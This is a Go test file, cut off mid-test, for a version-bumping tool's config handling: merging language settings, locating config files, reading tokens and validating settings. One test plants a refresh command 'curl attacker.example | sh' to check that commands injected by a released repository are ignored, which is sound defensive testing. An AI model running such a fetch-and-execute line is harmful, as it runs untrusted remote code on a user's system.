package entities_test

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/rios0rios0/autobump/internal/domain/entities"
	configEntities "github.com/rios0rios0/gitforge/pkg/config/domain/entities"
)

func TestMergeLanguagesConfig(t *testing.T) {
	t.Parallel()

	defaults := map[string]entities.LanguageConfig{
		"typescript": {
			Extensions:      []string{"ts"},
			SpecialPatterns: []string{"package.json", "tsconfig.json", "yarn.lock"},
			VersionFiles: []entities.VersionFile{
				{Path: "package.json", Patterns: []string{`(\s*"version":\s*")\d+\.\d+\.\d+(",)`}},
			},
		},
		"golang": {
			Extensions:      []string{"go"},
			SpecialPatterns: []string{"go.mod"},
		},
		"python": {
			Extensions:      []string{"py"},
			SpecialPatterns: []string{"pyproject.toml", "setup.cfg", "setup.py"},
			VersionFiles: []entities.VersionFile{
				{Path: "{project_name}/__init__.py", Patterns: []string{`(__version__\s*=\s*")\d+\.\d+\.\d+(")`}},
			},
		},
	}

	t.Run("should keep all defaults when user config is empty map", func(t *testing.T) {
		t.Parallel()

		// given
		overrides := map[string]entities.LanguageConfig{}

		// when
		result := entities.MergeLanguagesConfig(defaults, overrides)

		// then
		assert.Equal(t, defaults, result)
	})

	t.Run("should append user version files to default version files", func(t *testing.T) {
		t.Parallel()

		// given
		overrides := map[string]entities.LanguageConfig{
			"typescript": {
				VersionFiles: []entities.VersionFile{
					{Path: "opensearch_dashboards.json", Patterns: []string{`(\s*"version":\s*")\d+\.\d+\.\d+(",)`}},
				},
			},
		}

		// when
		result := entities.MergeLanguagesConfig(defaults, overrides)

		// then
		ts := result["typescript"]
		assert.Equal(t, []string{"ts"}, ts.Extensions)
		assert.Equal(t, []string{"package.json", "tsconfig.json", "yarn.lock"}, ts.SpecialPatterns)
		assert.Len(t, ts.VersionFiles, 2)
		assert.Equal(t, "package.json", ts.VersionFiles[0].Path)
		assert.Equal(t, "opensearch_dashboards.json", ts.VersionFiles[1].Path)
	})

	t.Run("should override default version file when user provides same path", func(t *testing.T) {
		t.Parallel()

		// given
		customPattern := `(\s*"version":\s*")\d+\.\d+\.\d+\.\d+(",)`
		overrides := map[string]entities.LanguageConfig{
			"typescript": {
				VersionFiles: []entities.VersionFile{
					{Path: "package.json", Patterns: []string{customPattern}},
				},
			},
		}

		// when
		result := entities.MergeLanguagesConfig(defaults, overrides)

		// then
		ts := result["typescript"]
		assert.Len(t, ts.VersionFiles, 1)
		assert.Equal(t, "package.json", ts.VersionFiles[0].Path)
		assert.Equal(t, []string{customPattern}, ts.VersionFiles[0].Patterns)
	})

	t.Run("should keep default extensions when user provides only version files", func(t *testing.T) {
		t.Parallel()

		// given
		overrides := map[string]entities.LanguageConfig{
			"typescript": {
				VersionFiles: []entities.VersionFile{
					{Path: "manifest.json", Patterns: []string{`("version":\s*")\d+\.\d+\.\d+(")`}},
				},
			},
		}

		// when
		result := entities.MergeLanguagesConfig(defaults, overrides)

		// then
		ts := result["typescript"]
		assert.Equal(t, []string{"ts"}, ts.Extensions)
		assert.Equal(t, []string{"package.json", "tsconfig.json", "yarn.lock"}, ts.SpecialPatterns)
	})

	t.Run("should add new language not present in defaults", func(t *testing.T) {
		t.Parallel()

		// given
		overrides := map[string]entities.LanguageConfig{
			"ruby": {
				Extensions:      []string{"rb"},
				SpecialPatterns: []string{"Gemfile"},
			},
		}

		// when
		result := entities.MergeLanguagesConfig(defaults, overrides)

		// then
		assert.Contains(t, result, "ruby")
		assert.Equal(t, []string{"rb"}, result["ruby"].Extensions)
		assert.Contains(t, result, "typescript")
		assert.Contains(t, result, "golang")
		assert.Contains(t, result, "python")
	})

	t.Run("should keep default language untouched when not in user config", func(t *testing.T) {
		t.Parallel()

		// given
		overrides := map[string]entities.LanguageConfig{
			"typescript": {
				VersionFiles: []entities.VersionFile{
					{Path: "extra.json", Patterns: []string{`("version":\s*")\d+\.\d+\.\d+(")`}},
				},
			},
		}

		// when
		result := entities.MergeLanguagesConfig(defaults, overrides)

		// then
		assert.Equal(t, defaults["golang"], result["golang"])
		assert.Equal(t, defaults["python"], result["python"])
	})

	t.Run("should deduplicate special patterns when user repeats default values", func(t *testing.T) {
		t.Parallel()

		// given
		overrides := map[string]entities.LanguageConfig{
			"typescript": {
				SpecialPatterns: []string{"package.json", "webpack.config.js"},
			},
		}

		// when
		result := entities.MergeLanguagesConfig(defaults, overrides)

		// then
		ts := result["typescript"]
		assert.Equal(t, []string{"package.json", "tsconfig.json", "yarn.lock", "webpack.config.js"}, ts.SpecialPatterns)
	})

	t.Run("should deduplicate extensions when user repeats default values", func(t *testing.T) {
		t.Parallel()

		// given
		overrides := map[string]entities.LanguageConfig{
			"typescript": {
				Extensions: []string{"ts", "tsx"},
			},
		}

		// when
		result := entities.MergeLanguagesConfig(defaults, overrides)

		// then
		ts := result["typescript"]
		assert.Equal(t, []string{"ts", "tsx"}, ts.Extensions)
	})

	t.Run("should replace refresh commands when user provides their own", func(t *testing.T) {
		t.Parallel()

		// given
		withDefaultCommand := map[string]entities.LanguageConfig{
			"typescript": {
				RefreshCommands: []entities.RefreshCommand{
					{Run: []string{"npm", "install", "--package-lock-only"}, Files: []string{"package-lock.json"}},
				},
			},
		}
		overrides := map[string]entities.LanguageConfig{
			"typescript": {
				RefreshCommands: []entities.RefreshCommand{
					{Run: []string{"yarn", "install", "--mode=update-lockfile"}, Files: []string{"yarn.lock"}},
				},
			},
		}

		// when
		result := entities.MergeLanguagesConfig(withDefaultCommand, overrides)

		// then
		ts := result["typescript"]
		assert.Equal(t, overrides["typescript"].RefreshCommands, ts.RefreshCommands)
	})

	t.Run("should clear refresh commands when user provides an empty list", func(t *testing.T) {
		t.Parallel()

		// given
		withDefaultCommand := map[string]entities.LanguageConfig{
			"typescript": {
				RefreshCommands: []entities.RefreshCommand{
					{Run: []string{"npm", "install", "--package-lock-only"}, Files: []string{"package-lock.json"}},
				},
			},
		}
		overrides := map[string]entities.LanguageConfig{
			"typescript": {RefreshCommands: []entities.RefreshCommand{}},
		}

		// when
		result := entities.MergeLanguagesConfig(withDefaultCommand, overrides)

		// then
		ts := result["typescript"]
		assert.Empty(t, ts.RefreshCommands)
	})

	t.Run("should keep default refresh commands when user provides none", func(t *testing.T) {
		t.Parallel()

		// given
		withDefaultCommand := map[string]entities.LanguageConfig{
			"typescript": {
				RefreshCommands: []entities.RefreshCommand{
					{Run: []string{"npm", "install", "--package-lock-only"}, Files: []string{"package-lock.json"}},
				},
			},
		}
		overrides := map[string]entities.LanguageConfig{
			"typescript": {Extensions: []string{"tsx"}},
		}

		// when
		result := entities.MergeLanguagesConfig(withDefaultCommand, overrides)

		// then
		ts := result["typescript"]
		assert.Equal(t, withDefaultCommand["typescript"].RefreshCommands, ts.RefreshCommands)
	})
}

// writeNamedConfig writes a per-project config under name and returns its path.
func writeNamedConfig(t *testing.T, dir, name, content string) string {
	t.Helper()

	path := filepath.Join(dir, name)
	require.NoError(t, os.WriteFile(path, []byte(content), 0o644))

	return path
}

// readProjectConfigFrom writes content as a per-project config and reads it back. Every
// ReadProjectConfig case shares that preamble and differs only in the content.
func readProjectConfigFrom(t *testing.T, content string) (*entities.GlobalConfig, error) {
	t.Helper()

	return entities.ReadProjectConfig(writeNamedConfig(t, t.TempDir(), ".autobump.yaml", content))
}

func TestFindProjectConfigFile(t *testing.T) {
	t.Parallel()

	// The four names AutoBump accepts, in the order it prefers them.
	acceptedNames := []string{".autobump.yaml", ".autobump.yml", "autobump.yaml", "autobump.yml"}

	for _, name := range acceptedNames {
		t.Run("should find "+name+" in project directory", func(t *testing.T) {
			t.Parallel()

			// given
			tmpDir := t.TempDir()
			configPath := writeNamedConfig(t, tmpDir, name, "languages: {}")

			// when
			result := entities.FindProjectConfigFile(tmpDir)

			// then
			assert.Equal(t, configPath, result)
		})
	}

	// Preference follows the order above, so every other name is checked against the
	// first: whichever pair is on disk, .autobump.yaml has to win.
	for _, lessPreferred := range acceptedNames[1:] {
		t.Run("should prefer .autobump.yaml over "+lessPreferred, func(t *testing.T) {
			t.Parallel()

			// given
			tmpDir := t.TempDir()
			preferred := writeNamedConfig(t, tmpDir, ".autobump.yaml", "languages: {}")
			writeNamedConfig(t, tmpDir, lessPreferred, "languages: {}")

			// when
			result := entities.FindProjectConfigFile(tmpDir)

			// then
			assert.Equal(t, preferred, result)
		})
	}

	t.Run("should return empty string when no config file exists", func(t *testing.T) {
		t.Parallel()

		// given
		tmpDir := t.TempDir()

		// when
		result := entities.FindProjectConfigFile(tmpDir)

		// then
		assert.Empty(t, result)
	})

	t.Run("should return empty string when directory does not exist", func(t *testing.T) {
		t.Parallel()

		// given
		nonExistentDir := filepath.Join(t.TempDir(), "does-not-exist")

		// when
		result := entities.FindProjectConfigFile(nonExistentDir)

		// then
		assert.Empty(t, result)
	})
}

func TestReadProjectConfig(t *testing.T) {
	t.Parallel()

	t.Run("should decode valid YAML with languages section", func(t *testing.T) {
		t.Parallel()

		// given
		content := "languages:\n  python:\n    extensions:\n      - 'py'\n"

		// when
		cfg, err := readProjectConfigFrom(t, content)

		// then
		require.NoError(t, err)
		require.NotNil(t, cfg)
		assert.Contains(t, cfg.LanguagesConfig, "python")
		assert.Equal(t, []string{"py"}, cfg.LanguagesConfig["python"].Extensions)
	})

	t.Run("should decode valid YAML without languages section", func(t *testing.T) {
		t.Parallel()

		// given
		content := "github_access_token: 'some-token'\n"

		// when
		cfg, err := readProjectConfigFrom(t, content)

		// then
		require.NoError(t, err)
		require.NotNil(t, cfg)
		assert.Nil(t, cfg.LanguagesConfig)
	})

	t.Run("should return error when file does not exist", func(t *testing.T) {
		t.Parallel()

		// given
		configPath := filepath.Join(t.TempDir(), "nonexistent.yaml")

		// when
		cfg, err := entities.ReadProjectConfig(configPath)

		// then
		require.Error(t, err)
		assert.Nil(t, cfg)
	})

	t.Run("should return error when file contains invalid YAML", func(t *testing.T) {
		t.Parallel()

		// given
		tmpDir := t.TempDir()
		configPath := filepath.Join(tmpDir, ".autobump.yaml")
		require.NoError(t, os.WriteFile(configPath, []byte("invalid: [yaml: {broken"), 0o644))

		// when
		cfg, err := entities.ReadProjectConfig(configPath)

		// then
		require.Error(t, err)
		assert.Nil(t, cfg)
	})

	t.Run("should ignore unknown fields in non-strict mode", func(t *testing.T) {
		t.Parallel()

		// given
		content := "custom_unknown_field: 'value'\nlanguages:\n  go:\n    extensions:\n      - 'go'\n"

		// when
		cfg, err := readProjectConfigFrom(t, content)

		// then
		require.NoError(t, err)
		require.NotNil(t, cfg)
		assert.Contains(t, cfg.LanguagesConfig, "go")
	})

	t.Run("should read versioning and changelog_path from per-project config", func(t *testing.T) {
		t.Parallel()

		// given
		content := "versioning: 'fork-dot'\nchangelog_path: 'CHANGELOG_PROPRIETARY.md'\n"

		// when
		cfg, err := readProjectConfigFrom(t, content)

		// then
		require.NoError(t, err)
		require.NotNil(t, cfg)
		assert.Equal(t, entities.VersioningForkDot, cfg.Versioning)
		assert.Equal(t, "CHANGELOG_PROPRIETARY.md", cfg.ChangelogPath)
	})

	t.Run("should correctly parse version files with regex patterns", func(t *testing.T) {
		t.Parallel()

		// given
		tmpDir := t.TempDir()
		configPath := filepath.Join(tmpDir, ".autobump.yaml")
		content := `languages:
  typescript:
    version_files:
      - path: 'package.json'
        patterns:
          - '(\s*"version":\s*")\d+\.\d+\.\d+(",)'
`
		require.NoError(t, os.WriteFile(configPath, []byte(content), 0o644))

		// when
		cfg, err := entities.ReadProjectConfig(configPath)

		// then
		require.NoError(t, err)
		require.NotNil(t, cfg)
		ts := cfg.LanguagesConfig["typescript"]
		require.Len(t, ts.VersionFiles, 1)
		assert.Equal(t, "package.json", ts.VersionFiles[0].Path)
		require.Len(t, ts.VersionFiles[0].Patterns, 1)
	})
}

func TestCopyGlobalConfigWithLanguageOverrides(t *testing.T) {
	t.Parallel()

	t.Run("should create a copy with merged languages without mutating original", func(t *testing.T) {
		t.Parallel()

		// given
		original := &entities.GlobalConfig{
			GitHubAccessToken: "my-token",
			LanguagesConfig: map[string]entities.LanguageConfig{
				"golang": {Extensions: []string{"go"}},
			},
		}
		overrides := map[string]entities.LanguageConfig{
			"python": {Extensions: []string{"py"}},
		}

		// when
		result := entities.CopyGlobalConfigWithLanguageOverrides(original, overrides)

		// then
		assert.Contains(t, result.LanguagesConfig, "golang")
		assert.Contains(t, result.LanguagesConfig, "python")
		assert.Equal(t, "my-token", result.GitHubAccessToken)
		assert.NotContains(t, original.LanguagesConfig, "python")
		assert.Len(t, original.LanguagesConfig, 1)
	})

	t.Run("should preserve all non-language fields from original", func(t *testing.T) {
		t.Parallel()

		// given
		original := &entities.GlobalConfig{
			GitHubAccessToken:      "gh-token",
			GitLabAccessToken:      "gl-token",
			AzureDevOpsAccessToken: "ado-token",
			GpgKeyPath:             "/path/to/key",
			GpgKeyPassphrase:       "passphrase",
			LanguagesConfig: map[string]entities.LanguageConfig{
				"golang": {Extensions: []string{"go"}},
			},
		}
		overrides := map[string]entities.LanguageConfig{}

		// when
		result := entities.CopyGlobalConfigWithLanguageOverrides(original, overrides)

		// then
		assert.Equal(t, "gh-token", result.GitHubAccessToken)
		assert.Equal(t, "gl-token", result.GitLabAccessToken)
		assert.Equal(t, "ado-token", result.AzureDevOpsAccessToken)
		assert.Equal(t, "/path/to/key", result.GpgKeyPath)
		assert.Equal(t, "passphrase", result.GpgKeyPassphrase)
	})

	t.Run("should handle empty overrides returning equivalent languages", func(t *testing.T) {
		t.Parallel()

		// given
		original := &entities.GlobalConfig{
			LanguagesConfig: map[string]entities.LanguageConfig{
				"golang": {Extensions: []string{"go"}},
			},
		}
		overrides := map[string]entities.LanguageConfig{}

		// when
		result := entities.CopyGlobalConfigWithLanguageOverrides(original, overrides)

		// then
		assert.Equal(t, original.LanguagesConfig, result.LanguagesConfig)
	})

	t.Run("should add new language not present in original", func(t *testing.T) {
		t.Parallel()

		// given
		original := &entities.GlobalConfig{
			LanguagesConfig: map[string]entities.LanguageConfig{
				"golang": {Extensions: []string{"go"}},
			},
		}
		overrides := map[string]entities.LanguageConfig{
			"ruby": {Extensions: []string{"rb"}, SpecialPatterns: []string{"Gemfile"}},
		}

		// when
		result := entities.CopyGlobalConfigWithLanguageOverrides(original, overrides)

		// then
		assert.Contains(t, result.LanguagesConfig, "golang")
		assert.Contains(t, result.LanguagesConfig, "ruby")
		assert.Equal(t, []string{"rb"}, result.LanguagesConfig["ruby"].Extensions)
	})

	t.Run("should merge version files for existing language", func(t *testing.T) {
		t.Parallel()

		// given
		original := &entities.GlobalConfig{
			LanguagesConfig: map[string]entities.LanguageConfig{
				"typescript": {
					Extensions: []string{"ts"},
					VersionFiles: []entities.VersionFile{
						{Path: "package.json", Patterns: []string{`("version":\s*")\d+\.\d+\.\d+(")`}},
					},
				},
			},
		}
		overrides := map[string]entities.LanguageConfig{
			"typescript": {
				VersionFiles: []entities.VersionFile{
					{Path: "manifest.json", Patterns: []string{`("version":\s*")\d+\.\d+\.\d+(")`}},
				},
			},
		}

		// when
		result := entities.CopyGlobalConfigWithLanguageOverrides(original, overrides)

		// then
		ts := result.LanguagesConfig["typescript"]
		assert.Len(t, ts.VersionFiles, 2)
		assert.Equal(t, "package.json", ts.VersionFiles[0].Path)
		assert.Equal(t, "manifest.json", ts.VersionFiles[1].Path)
		assert.Equal(t, []string{"ts"}, ts.Extensions)
	})

	t.Run("should not mutate the original LanguagesConfig map", func(t *testing.T) {
		t.Parallel()

		// given
		original := &entities.GlobalConfig{
			LanguagesConfig: map[string]entities.LanguageConfig{
				"golang": {Extensions: []string{"go"}},
			},
		}
		overrides := map[string]entities.LanguageConfig{
			"golang": {SpecialPatterns: []string{"go.sum"}},
			"python": {Extensions: []string{"py"}},
		}
		originalLangsCount := len(original.LanguagesConfig)

		// when
		_ = entities.CopyGlobalConfigWithLanguageOverrides(original, overrides)

		// then
		assert.Len(t, original.LanguagesConfig, originalLangsCount)
		assert.NotContains(t, original.LanguagesConfig, "python")
		assert.Empty(t, original.LanguagesConfig["golang"].SpecialPatterns)
	})

	t.Run("should ignore a refresh command injected by the released repository", func(t *testing.T) {
		t.Parallel()

		// given
		// This is the config that ships inside the repository being released, which in run
		// mode is one AutoBump discovered rather than one anybody vetted.
		global := &entities.GlobalConfig{
			LanguagesConfig: map[string]entities.LanguageConfig{
				"typescript": {
					RefreshCommands: []entities.RefreshCommand{
						{Run: []string{"yarn", "install", "--mode=update-lockfile"}, Files: []string{"yarn.lock"}},
					},
				},
			},
		}
		projectOverrides := map[string]entities.LanguageConfig{
			"typescript": {
				RefreshCommands: []entities.RefreshCommand{
					{Run: []string{"sh", "-c", "curl attacker.example | sh"}, Files: []string{"yarn.lock"}},
				},
			},
		}

		// when
		merged := entities.CopyGlobalConfigWithLanguageOverrides(global, projectOverrides)

		// then
		refreshCommands := merged.LanguagesConfig["typescript"].RefreshCommands
		require.Len(t, refreshCommands, 1)
		assert.Equal(t, []string{"yarn", "install", "--mode=update-lockfile"}, refreshCommands[0].Run)
	})

	t.Run("should let the released repository opt out of a refresh", func(t *testing.T) {
		t.Parallel()

		// given
		// Clearing only ever removes execution, so it is the one thing a repository is
		// allowed to say about refresh commands.
		global := &entities.GlobalConfig{
			LanguagesConfig: map[string]entities.LanguageConfig{
				"typescript": {
					RefreshCommands: []entities.RefreshCommand{
						{Run: []string{"yarn", "install", "--mode=update-lockfile"}, Files: []string{"yarn.lock"}},
					},
				},
			},
		}
		projectOverrides := map[string]entities.LanguageConfig{
			"typescript": {RefreshCommands: []entities.RefreshCommand{}},
		}

		// when
		merged := entities.CopyGlobalConfigWithLanguageOverrides(global, projectOverrides)

		// then
		assert.Empty(t, merged.LanguagesConfig["typescript"].RefreshCommands)
		assert.Len(t, global.LanguagesConfig["typescript"].RefreshCommands, 1, "the original must not move")
	})
}

// TestExpandHome is deliberately not parallel: it calls t.Setenv, which the runtime forbids in a parallel test.
func TestExpandHome(t *testing.T) {
	t.Run("should expand tilde prefix when path starts with ~/", func(t *testing.T) {
		// given
		t.Setenv("HOME", filepath.Join(string(os.PathSeparator), "home", "testuser"))
		value := "~/some/path"

		// when
		entities.ExpandHome(&value)

		// then
		expected := filepath.Join(os.Getenv("HOME"), "some/path")
		assert.Equal(t, expected, value)
	})

	t.Run("should not modify path when it does not start with ~/", func(t *testing.T) {
		// given
		value := "/absolute/path"

		// when
		entities.ExpandHome(&value)

		// then
		assert.Equal(t, "/absolute/path", value)
	})

	t.Run("should not modify empty string", func(t *testing.T) {
		// given
		value := ""

		// when
		entities.ExpandHome(&value)

		// then
		assert.Empty(t, value)
	})
}

func TestHandleTokenFile(t *testing.T) {
	t.Parallel()

	t.Run("should read token from file when path exists", func(t *testing.T) {
		t.Parallel()

		// given
		tmpDir := t.TempDir()
		tokenFile := filepath.Join(tmpDir, "token.txt")
		require.NoError(t, os.WriteFile(tokenFile, []byte("secret-token\n"), 0o644))
		token := tokenFile

		// when
		entities.HandleTokenFile("test token", &token)

		// then
		assert.Equal(t, "secret-token", token)
	})

	t.Run("should keep inline token when path does not exist as file", func(t *testing.T) {
		t.Parallel()

		// given
		token := "inline-token-value"

		// when
		entities.HandleTokenFile("test token", &token)

		// then
		assert.Equal(t, "inline-token-value", token)
	})

	t.Run("should not modify empty token", func(t *testing.T) {
		t.Parallel()

		// given
		token := ""

		// when
		entities.HandleTokenFile("test token", &token)

		// then
		assert.Empty(t, token)
	})
}

func TestValidateGlobalConfig(t *testing.T) {
	t.Parallel()

	t.Run("should return nil when config has languages and valid projects", func(t *testing.T) {
		t.Parallel()

		// given
		cfg := &entities.GlobalConfig{
			LanguagesConfig: map[string]entities.LanguageConfig{"go": {}},
			Projects: []entities.ProjectConfig{
				{Path: "/some/path"},
			},
		}

		// when
		err := entities.ValidateGlobalConfig(cfg, false)

		// then
		assert.NoError(t, err)
	})

	t.Run("should return error when languages config is nil", func(t *testing.T) {
		t.Parallel()

		// given
		cfg := &entities.GlobalConfig{
			LanguagesConfig: nil,
		}

		// when
		err := entities.ValidateGlobalConfig(cfg, false)

		// then
		require.Error(t, err)
		assert.ErrorIs(t, err, entities.ErrLanguagesKeyMissingError)
	})

	t.Run("should return error when project path is empty", func(t *testing.T) {
		t.Parallel()

		// given
		cfg := &entities.GlobalConfig{
			LanguagesConfig: map[string]entities.LanguageConfig{"go": {}},
			Projects:        []entities.ProjectConfig{{Path: ""}},
		}

		// when
		err := entities.ValidateGlobalConfig(cfg, false)

		// then
		require.Error(t, err)
		assert.Contains(t, err.Error(), "projects[0].path")
	})

	t.Run("should return error when batch mode has no projects", func(t *testing.T) {
		t.Parallel()

		// given
		cfg := &entities.GlobalConfig{
			LanguagesConfig: map[string]entities.LanguageConfig{"go": {}},
			Projects:        []entities.ProjectConfig{},
		}

		// when
		err := entities.ValidateGlobalConfig(cfg, true)

		// then
		require.Error(t, err)
		assert.Contains(t, err.Error(), "projects")
	})

	t.Run("should return error when batch mode has no access token", func(t *testing.T) {
		t.Parallel()

		// given
		cfg := &entities.GlobalConfig{
			LanguagesConfig: map[string]entities.LanguageConfig{"go": {}},
			Projects:        []entities.ProjectConfig{{Path: "/path"}},
		}

		// when
		err := entities.ValidateGlobalConfig(cfg, true)

		// then
		require.Error(t, err)
		assert.Contains(t, err.Error(), "project_access_token")
	})

	t.Run("should pass batch validation when global token is set", func(t *testing.T) {
		t.Parallel()

		// given
		cfg := &entities.GlobalConfig{
			LanguagesConfig:   map[string]entities.LanguageConfig{"go": {}},
			GitHubAccessToken: "ghp_token",
			Projects:          []entities.ProjectConfig{{Path: "/path"}},
		}

		// when
		err := entities.ValidateGlobalConfig(cfg, true)

		// then
		assert.NoError(t, err)
	})
}

func TestValidateProviders(t *testing.T) {
	t.Parallel()

	// One provider entry per rule, plus the two shapes that are valid. wantErrContains is
	// empty when the entry is expected to validate.
	testCases := []struct {
		name            string
		providers       []configEntities.ProviderConfig
		wantErrContains string
	}{
		{
			name: "should return nil when providers are valid",
			providers: []configEntities.ProviderConfig{
				{Type: "github", Token: "token", Organizations: []string{"org1"}},
			},
		},
		{
			name:      "should return nil when providers list is empty",
			providers: []configEntities.ProviderConfig{},
		},
		{
			name: "should return error when provider type is empty",
			providers: []configEntities.ProviderConfig{
				{Type: "", Token: "token", Organizations: []string{"org1"}},
			},
			wantErrContains: "providers[0].type",
		},
		{
			name: "should return error when provider token is empty",
			providers: []configEntities.ProviderConfig{
				{Type: "github", Token: "", Organizations: []string{"org1"}},
			},
			wantErrContains: "providers[0].token",
		},
		{
			name: "should return error when provider has no organizations",
			providers: []configEntities.ProviderConfig{
				{Type: "github", Token: "token", Organizations: []string{}},
			},
			wantErrContains: "organizations",
		},
	}

	for _, testCase := range testCases {
		t.Run(testCase.name, func(t *testing.T) {
			t.Parallel()

			// when
			err := entities.ValidateProviders(testCase.providers)

			// then
			if testCase.wantErrContains == "" {
				require.NoError(t, err)

				return
			}

			require.Error(t, err)
			assert.Contains(t, err.Error(), testCase.wantErrContains)
		})
	}
}

func TestReadConfig(t *testing.T) {
	t.Parallel()

	t.Run("should read and parse a valid config file", func(t *testing.T) {
		t.Parallel()

		// given
		tmpDir := t.TempDir()
		configPath := filepath.Join(tmpDir, "autobump.yaml")
		content := `languages:
  go:
    extensions:
      - 'go'
    special_patterns:
      - 'go.mod'
projects:
  - path: '/home/user/repo1'
github_access_token: 'ghp_test123'
`
		require.NoError(t, os.WriteFile(configPath, []byte(content), 0o644))

		// when
		cfg, err := entities.ReadConfig(configPath)

		// then
		require.NoError(t, err)
		require.NotNil(t, cfg)
		assert.Contains(t, cfg.LanguagesConfig, "go")
		assert.Equal(t, "ghp_test123", cfg.GitHubAccessToken)
		require.Len(t, cfg.Projects, 1)
		assert.Equal(t, "/home/user/repo1", cfg.Projects[0].Path)
		assert.Equal(t, "repo1", cfg.Projects[0].Name)
	})

	t.Run("should return error when config file does not exist", func(t *testing.T) {
		t.Parallel()

		// given
		configPath := filepath.Join(t.TempDir(), "nonexistent.yaml")

		// when
		cfg, err := entities.ReadConfig(configPath)

		// then
		require.Error(t, err)
		assert.Nil(t, cfg)
	})

	t.Run("should derive project name from path when name is empty", func(t *testing.T) {
		t.Parallel()

		// given
		tmpDir := t.TempDir()
		configPath := filepath.Join(tmpDir, "autobump.yaml")
		content := `languages:
  go:
    extensions:
      - 'go'
projects:
  - path: 'git@github.com:org/my-repo.git'
`
		require.NoError(t, os.WriteFile(configPath, []byte(content), 0o644))

		// when
		cfg, err := entities.ReadConfig(configPath)

		// then
		require.NoError(t, err)
		assert.Equal(t, "my-repo", cfg.Projects[0].Name)
	})

	t.Run("should read token from file when token value is a file path", func(t *testing.T) {
		t.Parallel()

		// given
		tmpDir := t.TempDir()
		tokenFile := filepath.Join(tmpDir, "token.txt")
		require.NoError(t, os.WriteFile(tokenFile, []byte("file-token-value"), 0o644))
		configPath := filepath.Join(tmpDir, "autobump.yaml")
		content := "languages:\n  go:\n    extensions:\n      - 'go'\ngithub_access_token: '" + tokenFile + "'\n"
		require.NoError(t, os.WriteFile(configPath, []byte(content), 0o644))

		// when
		cfg, err := entities.ReadConfig(configPath)

		// then
		require.NoError(t, err)
		assert.Equal(t, "file-token-value", cfg.GitHubAccessToken)
	})
}

func TestDecodeConfig(t *testing.T) {
	t.Parallel()

	t.Run("should return error when YAML is invalid", func(t *testing.T) {
		t.Parallel()

		// given
		data := []byte("invalid: [yaml: {broken")

		// when
		cfg, err := entities.DecodeConfig(data, false)

		// then
		require.Error(t, err)
		assert.Nil(t, cfg)
	})

	t.Run("should reject unknown fields when strict is true", func(t *testing.T) {
		t.Parallel()

		// given
		data := []byte("unknown_field: 'value'\nlanguages:\n  go:\n    extensions:\n      - 'go'\n")

		// when
		cfg, err := entities.DecodeConfig(data, true)

		// then
		require.Error(t, err)
		assert.Nil(t, cfg)
	})

	t.Run("should accept unknown fields when strict is false", func(t *testing.T) {
		t.Parallel()

		// given
		data := []byte("unknown_field: 'value'\nlanguages:\n  go:\n    extensions:\n      - 'go'\n")

		// when
		cfg, err := entities.DecodeConfig(data, false)

		// then
		require.NoError(t, err)
		require.NotNil(t, cfg)
		assert.Contains(t, cfg.LanguagesConfig, "go")
	})
}

func TestFindConfigOnMissing(t *testing.T) {
	t.Parallel()

	t.Run("should return provided path when not empty", func(t *testing.T) {
		t.Parallel()

		// given
		configPath := "/some/explicit/path.yaml"

		// when
		result := entities.FindConfigOnMissing(configPath)

		// then
		assert.Equal(t, configPath, result)
	})

	t.Run("should search default locations when path is empty", func(t *testing.T) {
		t.Parallel()

		// given / when
		result := entities.FindConfigOnMissing("")

		// then
		assert.NotEmpty(t, result)
	})
}

// These cases cannot join TestFindConfigOnMissing above: it calls t.Parallel(), and t.Setenv
// and t.Chdir panic under a parallel parent.
func TestFindConfigOnMissingSearchOrder(t *testing.T) {
	// The bug this ordering exists to prevent: AutoBump runs with the repository it is releasing
	// as the working directory, that repository legitimately carries its own `.autobump.yaml`,
	// and picking it as the GLOBAL config silently drops every setting honoured only from the
	// operator's own file -- `refresh_commands` above all.
	t.Run("should prefer the home config over one in the working directory", func(t *testing.T) {
		// given
		home := t.TempDir()
		t.Setenv("HOME", home)
		writeYAML(t, filepath.Join(home, ".autobump.yaml"))
		project := t.TempDir()
		writeYAML(t, filepath.Join(project, ".autobump.yaml"))
		t.Chdir(project)

		// when
		result := entities.FindConfigOnMissing("")

		// then
		assert.Equal(t, filepath.Join(home, ".autobump.yaml"), result)
	})

	t.Run("should fall back to the working directory when the home has no config", func(t *testing.T) {
		// given
		t.Setenv("HOME", t.TempDir())
		project := t.TempDir()
		writeYAML(t, filepath.Join(project, ".autobump.yaml"))
		t.Chdir(project)

		// when
		result := entities.FindConfigOnMissing("")

		// then
		resolved, err := filepath.Abs(result)
		require.NoError(t, err)
		assert.Equal(t, filepath.Join(project, ".autobump.yaml"), resolved,
			"an operator with no home config has no operator-level settings to lose")
	})

	t.Run("should fall back to the published default configuration when nothing is found", func(t *testing.T) {
		// given
		t.Setenv("HOME", t.TempDir())
		t.Chdir(t.TempDir())

		// when
		result := entities.FindConfigOnMissing("")

		// then
		assert.Equal(t, entities.DefaultConfigURL, result)
	})

	t.Run("should return the given path untouched when one is supplied", func(t *testing.T) {
		// given
		home := t.TempDir()
		t.Setenv("HOME", home)
		writeYAML(t, filepath.Join(home, ".autobump.yaml"))

		// when
		result := entities.FindConfigOnMissing("/explicit/path.yaml")

		// then
		assert.Equal(t, "/explicit/path.yaml", result,
			"an explicit -c must win over any discovery")
	})
}

// writeYAML creates a minimal, valid config file at the given path.
func writeYAML(t *testing.T, path string) {
	t.Helper()

	require.NoError(t, os.WriteFile(path, []byte("languages:\n"), 0o600))
}

func TestResolveVersioning(t *testing.T) {
	t.Parallel()

	t.Run("should default to semver when both configs are nil", func(t *testing.T) {
		t.Parallel()

		// given / when
		mode := entities.ResolveVersioning(nil, nil)

		// then
		assert.Equal(t, entities.VersioningSemver, mode)
	})

	t.Run("should return project versioning when set", func(t *testing.T) {
		t.Parallel()

		// given
		globalConfig := &entities.GlobalConfig{Versioning: entities.VersioningSemver}
		projectConfig := &entities.ProjectConfig{Versioning: entities.VersioningForkDot}

		// when
		mode := entities.ResolveVersioning(globalConfig, projectConfig)

		// then
		assert.Equal(t, entities.VersioningForkDot, mode)
	})

	t.Run("should fall back to global versioning when project is empty", func(t *testing.T) {
		t.Parallel()

		// given
		globalConfig := &entities.GlobalConfig{Versioning: entities.VersioningForkDash}
		projectConfig := &entities.ProjectConfig{}

		// when
		mode := entities.ResolveVersioning(globalConfig, projectConfig)

		// then
		assert.Equal(t, entities.VersioningForkDash, mode)
	})

	t.Run("should normalize unknown modes to semver", func(t *testing.T) {
		t.Parallel()

		// given
